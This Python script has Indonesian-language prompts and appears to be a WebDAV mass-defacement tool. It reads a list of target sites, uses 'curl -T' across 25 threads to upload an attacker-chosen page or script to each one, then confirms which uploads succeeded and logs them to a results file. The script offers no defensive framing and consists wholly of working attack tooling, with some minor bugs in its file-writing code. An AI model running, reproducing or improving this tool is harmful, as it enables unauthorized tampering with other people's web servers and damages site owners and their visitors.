
import os , sys, requests
from threading import Thread
from multiprocessing.pool import ThreadPool
import time
m="\033[1;31m"
ht="\e[32;1m;5m"
gk="\033[5;32m"
gt="\033[1;32m"
g="\033[0;32m"
w="\033[1;37m"
c="\033[1;36m"
y="\033[1;33m"
try:
    os.mkdir('deface')
except:
    pass
banner ='''\033[1;31m
    e Y8b               888 88P ,e,                         
   d8b Y8b     dP"Y     888 8P   "  888 8e   e88 888        
  d888b Y8b   C88b  888 888 K   888 888 88b d888 888        
 d888888888b   Y88D     888 8b  888 888 888 Y888 888        
d8888888b Y8b d,dP      888 88b 888 888 888  "88 888        
                                              ,  88P        
                                             "8",P" \033[1;32m        
Y8b Y8b Y888P         888           888         Y8b Y88888P 
 Y8b Y8b Y8P   ,e e,  888 88e   e88 888  ,"Y88b  Y8b Y888P  
  Y8b Y8b Y   d88 88b 888 888b d888 888 "8" 888   Y8b Y8P   
   Y8b Y8b    888   , 888 888P Y888 888 ,ee 888    Y8b Y    
    Y8P Y      "YeeP" 888 88"   "88 888 "88 888     Y8P     
                                                            
                                                            '''
print(banner)
def target():
    aa =input("Masukan Link Target : ")
    bb =input("Masukan Alamat File : ")
    cc =input("Tulis ulang nama File saja: ")
    os.system("cp %s %s"%(bb,cc))
    os.system("curl -T %s %s"%(cc,aa))
    a = aa+'/'+cc
    b = requests.get(a)
    if 'error' in str(b.content) or 'not found' in str(b.content):
        print('Gagal ! (Website Not Vuln)')
        sys.exit()
    else:
        print('Sukses Deface Link : %s'%(a))
        time.sleep(2)
        sys.exit()
while(True):
    ass = input("Webdav Mass or Target (m/t)? : ")
    if ass == 'm':
        pass
        break
    elif ass == 't':
        target()
        break
cek=[]
def exec(z):
    try:
        os.system("curl -T %s %s 2>/dev/null"%(b,z))
        os.system("clear")
        print('%sloading'%(gk))
    except:
        pass
    try:
        url = z + '/' + b
        aha = requests.get(url)
        zs = aha.content
        if 'error' in str(zs) or 'not found' in str(zs):
            print('')
        else:
            true='good'
            cek.append(true)
            hsl = open('deface/hasil.txt','a')
            hsl.write(url+'\n')
            hsl.close()
    except:
        pass

try:
    a = open("bin/list.txt","r").read().splitlines()
    print("Succes Read File")
    os.system("clear")
except:
    print("Failed Read File")
    print("Check Your file list")
    pass
try:
    while(True):
        print('''
        [1] . Tulis script
        [2] . ambil dari File ''')
        wanjer = input("Masukan Pilihan : ")
        if wanjer == '1':
            asw = input('copy script disini')
            sad = input('input nama file dengan ?[exmple : web.html] : ')
            hah = open('%s'%(sad),'w').write()
            hah.write(asw)
            hah.close()
            b = str(sad)
            break
        elif wanjer == '2':
            ab = input("Masukan alamat File : ")
            cc =input("Tulis ulang nama File saja: ")
            os.system("cp %s %s"%(ab,cc))
            b = str(cc)
            break
except:
    pass
z = []
for c in a:
    z.append(c)
t=ThreadPool(25)
t.map(exec,z)
def cek(k):
    try:
        ass = requests.get(k)
        asw = ass.content
        if 'error' in str(asw) or '404 Not Found' in str(asw) or 'Bad Request' in str(asw):
            pass
        else: 
            print("%s"%(y)+k+'%s[200 OK]%s%s %s'%(gk,g,gt,y))
    except:
        pass
uhuy = open('deface/hasil.txt','r').read().splitlines()
x = []
for d in uhuy:
    x.append(d)
f=ThreadPool(25)
f.map(cek, x)
print("\n")
print ("%sFile Tersimpan di folder deface/Hasil.txt"%(c))
